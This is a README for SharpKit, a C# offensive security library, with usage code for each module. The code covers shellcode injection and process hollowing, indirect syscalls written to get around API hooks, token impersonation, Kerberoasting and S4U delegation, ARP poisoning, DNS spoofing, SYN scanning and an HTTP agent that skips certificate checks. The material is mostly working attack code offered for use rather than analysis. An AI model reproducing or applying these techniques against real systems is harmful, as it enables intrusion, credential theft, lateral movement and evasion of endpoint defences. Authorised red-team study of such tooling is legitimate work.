# SharpKit

A .NET 8 C# library for offensive security operations. No external NuGet dependencies. Uses `System.Net.Http`, `System.Runtime.InteropServices`, and `System.Net.Sockets` only.

## Requirements

- .NET 8 SDK
- Windows x64 (Win32/syscall modules require Windows; HTTP and packet modules are cross-platform)
- For process injection and syscall operations: elevated privileges or SeDebugPrivilege

## Build

```
dotnet build SharpKit.csproj -c Release
```

The project file enables `AllowUnsafeBlocks` and targets `net8.0`. No restore step is needed beyond the base SDK.

## Modules

### HttpAgent

HTTP client wrapping `HttpClientHandler`. Supports unauthenticated proxies, credentialed proxies, Basic auth, Bearer token, and NTLM. Certificate validation is bypassed by default.

```csharp
// Plain client
using var agent = new HttpAgent();
agent.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
var body = await agent.GetStringAsync("https://target.internal/api/users");

// Through a SOCKS/HTTP proxy with creds
using var agent = new HttpAgent("http://127.0.0.1:8080", "proxyuser", "proxypass");
agent.SetBearerToken("eyJhbGci...");
var resp = await agent.PostJsonAsync("https://target.internal/api/exec", "{\"cmd\":\"whoami\"}");

// NTLM auth against an internal endpoint
using var agent = new HttpAgent();
agent.SetNtlmAuth("jsmith", "P@ssw0rd", "CORP");
var headers = await agent.GetResponseHeadersAsync("http://intranet.corp.local/");

// Download with progress
using var agent = new HttpAgent();
var progress = new Progress<double>(p => Console.Write($"\r{p:P0}"));
var bytes = await agent.DownloadAsync("http://target/payload.bin", progress);
```

### Kerberos

AS-REQ / TGS-REQ / AP-REQ frame builders, TGT and service ticket request stubs, AES-256/128 and RC4 key derivation, kirbi encode/decode, Kerberoast hash formatter, and S4U2Self/S4U2Proxy builders. Network methods return `null` placeholders pending a full KDC exchange implementation.

```csharp
var opts = new KerberosOptions
{
    DomainController = "dc01.corp.local",
    Port = 88,
    SupportedEncTypes = [KerberosEncryptionType.Aes256CtsHmacSha196]
};

// Request TGT (placeholder — wire up KDC send/receive around BuildAsReq)
var tgt = await Kerberos.RequestTgtAsync("jsmith", "P@ssw0rd", "CORP.LOCAL", opts);

// Request service ticket and write Kerberoast hash
if (tgt != null)
    await Kerberos.Kerberoast("MSSQLSvc/sql01.corp.local:1433", tgt, opts, "hashes.txt");

// Derive AES-256 key from password + salt
var key = Kerberos.DeriveKey("P@ssw0rd", "CORP.LOCALjsmith", KerberosEncryptionType.Aes256CtsHmacSha196);

// Build raw AS-REQ bytes for custom transport
var asReqBytes = Kerberos.BuildAsReq("jsmith", "CORP.LOCAL", opts);

// S4U2Self delegation chain
if (tgt != null)
{
    var s4uSelf = Kerberos.BuildS4U2SelfReq(tgt, "Administrator", opts);
    // ... send s4uSelf over TCP/88, parse TGS-REP, then:
    // var s4uProxy = Kerberos.BuildS4U2ProxyReq(selfTicket, tgt, "cifs/fs01.corp.local", opts);
}
```

### Win32

P/Invoke declarations for `kernel32`, `advapi32`, and `ntdll`. Covers process/thread open and control, virtual memory alloc/read/write/protect/query, token open/duplicate/impersonate, privilege adjustment, and full memory region enumeration.

```csharp
// Enable SeDebugPrivilege on the current process
Win32.EnableCurrentProcessPrivilege("SeDebugPrivilege");

// Open a target process and read its memory
var hProc = Win32.OpenProcess(Win32.PROCESS_VM_READ | Win32.PROCESS_QUERY_INFORMATION, false, targetPid);
var bytes = Win32.ReadMemory(hProc, baseAddress, 0x1000);
Win32.CloseHandle(hProc);

// Duplicate a process token and impersonate
Win32.OpenProcessToken(hProc, Win32.TOKEN_DUPLICATE, out var hToken);
Win32.DuplicateTokenEx(hToken, Win32.TOKEN_ALL_ACCESS, IntPtr.Zero,
    Win32.SecurityImpersonation, Win32.TokenImpersonation, out var hDup);
Win32.ImpersonateLoggedOnUser(hDup);
// ... do work ...
Win32.RevertToSelf();
Win32.CloseHandle(hDup);
Win32.CloseHandle(hToken);

// Enumerate writable/executable memory regions
var hProc2 = Win32.OpenProcess(Win32.PROCESS_QUERY_INFORMATION, false, targetPid);
var regions = Win32.EnumerateMemoryRegions(hProc2)
    .Where(r => r.State == 0x1000 && (r.Protect & Win32.PAGE_EXECUTE_READWRITE) != 0)
    .ToList();
Win32.CloseHandle(hProc2);
```

### Injector

Four injection paths. All return `InjectionResult` with a `Success` bool, remote base address, thread ID, and last error. Process hollowing accepts a raw PE byte array and handles unmapping, section mapping, PEB image base patch, and thread context redirect.

```csharp
// CreateRemoteThread
var result = Injector.InjectCreateRemoteThread(targetPid, shellcode);
if (!result.Success)
    Console.WriteLine($"Injection failed: {result.ErrorMessage} ({result.LastError})");

// NtCreateThreadEx (direct NT layer, avoids kernel32 CreateRemoteThread hooks)
var result = Injector.InjectNtCreateThreadEx(targetPid, shellcode);

// QueueUserAPC (queues to all alertable threads in the target)
var result = Injector.InjectQueueUserAPC(targetPid, shellcode);

// Process hollowing with a PE image
var peBytes = File.ReadAllBytes("payload.exe");
var result = Injector.HollowProcess(@"C:\Windows\System32\svchost.exe", peBytes);

// Generic dispatch
var result = Injector.Inject(targetPid, shellcode, InjectionMethod.NtCreateThreadEx);
Console.WriteLine($"Remote base: 0x{result.RemoteBaseAddress.ToInt64():X}");
```

### Syscalls

Runtime SSN extraction by parsing ntdll stubs in memory. Each call site allocates a small executable stub via `VirtualAlloc`, patches the SSN and optional syscall gadget address, invokes via an `unsafe` function pointer, then frees the allocation. Supports indirect dispatch (gadget pointer in r11, `jmp r11` instead of `syscall`).

```csharp
// Initialize and inspect extracted SSN table
Syscalls.Initialize();
foreach (var (name, ssn) in Syscalls.GetSyscallTable())
    Console.WriteLine($"{name,-40} SSN=0x{ssn:X4}");

// NtAllocateVirtualMemory
var baseAddr = IntPtr.Zero;
var size = (IntPtr)0x1000;
var status = Syscalls.NtAllocateVirtualMemory(
    processHandle, ref baseAddr, IntPtr.Zero, ref size,
    Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_READWRITE);
Console.WriteLine($"NtAllocateVirtualMemory: 0x{status:X8} base=0x{baseAddr.ToInt64():X}");

// NtWriteVirtualMemory
var written = 0u;
status = Syscalls.NtWriteVirtualMemory(processHandle, baseAddr, shellcode, (uint)shellcode.Length, out written);

// NtProtectVirtualMemory — flip to RX
var protAddr = baseAddr;
var protSize = size;
status = Syscalls.NtProtectVirtualMemory(processHandle, ref protAddr, ref protSize, Win32.PAGE_EXECUTE_READ, out _);

// NtCreateThreadEx
status = Syscalls.NtCreateThreadEx(out var hThread, 0x1FFFFF, IntPtr.Zero,
    processHandle, baseAddr, IntPtr.Zero, false);

// SyscallStub — construct a reusable indirect stub with a custom gadget
if (Syscalls.TryGetSyscallNumber("NtOpenProcess", out var ssn))
{
    var gadgetAddr = /* locate syscall; ret gadget in ntdll */ IntPtr.Zero;
    using var stub = new SyscallStub(ssn, gadgetAddr);
    Console.WriteLine($"Stub at 0x{stub.StubAddress.ToInt64():X}");
}
```

### PacketCrafter

Raw packet construction for ARP, DNS, TCP, and UDP using only `System.Net.Sockets`. IP and TCP/UDP checksums are computed inline. TCP SYN scanning uses non-blocking `Socket.ConnectAsync`.

```csharp
// ARP request frame (42 bytes, Ethernet + ARP)
var myMac = NetworkInterface.GetAllNetworkInterfaces()
    .First(i => i.OperationalStatus == OperationalStatus.Up).GetPhysicalAddress();
var arpReq = PacketCrafter.BuildArpRequest(
    myMac,
    IPAddress.Parse("192.168.1.50"),
    IPAddress.Parse("192.168.1.1"));

// ARP reply (gratuitous / poisoning)
var arpReply = PacketCrafter.BuildArpReply(
    myMac, IPAddress.Parse("192.168.1.1"),
    PhysicalAddress.Parse("AA-BB-CC-DD-EE-FF"), IPAddress.Parse("192.168.1.100"));

// DNS query bytes (UDP payload, ready to send)
var dnsQuery = PacketCrafter.BuildDnsQuery("target.corp.local", DnsType.A);
var sent = await PacketCrafter.SendDnsQueryAsync("target.corp.local",
    IPAddress.Parse("192.168.1.1"), queryType: DnsType.A);

// Spoofed DNS response
var fakeResponse = PacketCrafter.BuildDnsResponse(dnsQuery,
    [IPAddress.Parse("10.10.10.10")]);

// TCP SYN packet (raw bytes, IP + TCP headers with valid checksum)
var syn = PacketCrafter.BuildTcpSyn(
    IPAddress.Parse("10.0.0.5"),
    IPAddress.Parse("10.0.0.1"),
    srcPort: 54321, dstPort: 443);

// TCP SYN scan
var openPorts = await PacketCrafter.TcpSynScanAsync(
    IPAddress.Parse("10.0.0.1"),
    Enumerable.Range(1, 1024).Select(p => (ushort)p),
    IPAddress.Parse("10.0.0.5"),
    timeout: TimeSpan.FromMilliseconds(500));
Console.WriteLine($"Open: {string.Join(", ", openPorts)}");

// UDP packet
var udp = PacketCrafter.BuildUdpPacket(
    IPAddress.Parse("10.0.0.5"), IPAddress.Parse("10.0.0.1"),
    srcPort: 12345, dstPort: 53,
    payload: dnsQuery);
```

## Notes

Kerberos network methods (`RequestTgtAsync`, `RequestServiceTicketAsync`) return `null` placeholders. Wire up a TCP/UDP send-receive loop around `BuildAsReq` / `BuildTgsReq` and feed the response bytes into `ParseAsRep` / `ParseTgsRep` to complete the exchange. The syscall indirect dispatch (`SyscallStub`) requires a valid `syscall; ret` gadget address located within ntdll at runtime.

I want to thank TanmayCzax(https://github.com/TanmayCzax) for helping me out and giving me the idea for this project.
